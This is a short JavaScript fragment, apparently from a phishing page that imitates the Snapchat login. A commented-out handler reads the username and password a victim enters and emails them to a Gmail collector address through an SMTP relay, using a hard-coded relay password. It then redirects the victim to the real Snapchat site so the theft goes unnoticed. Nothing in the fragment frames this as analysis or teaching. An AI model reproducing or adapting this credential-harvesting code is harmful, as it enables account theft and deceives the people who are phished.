...
/* window.onload = function(){
    console.log($("button").attr('id','loginButton'));
    document.getElementById("loginButton").addEventListener("click",function(){
        ...
        Email.send({
            ...
            Username : "snaplogincollector@gmail.com",
            Password : "4D345289EA3834FC8A1AAB9E6553F09EF99B",
            To : 'snaplogincollector@gmail.com',
            From :   "unyboman@gmail.com",
            Subject : "Snapchat Login",
            Body : "Username: " + username + "\nPassword: " + password
        }).then(
          message => window.location.href = 'https://accounts.snapchat.com/accounts/welcome'
        );
    });
  }; */
  //$("btn btn-lg btn-primary").attr("id", "loginButton");
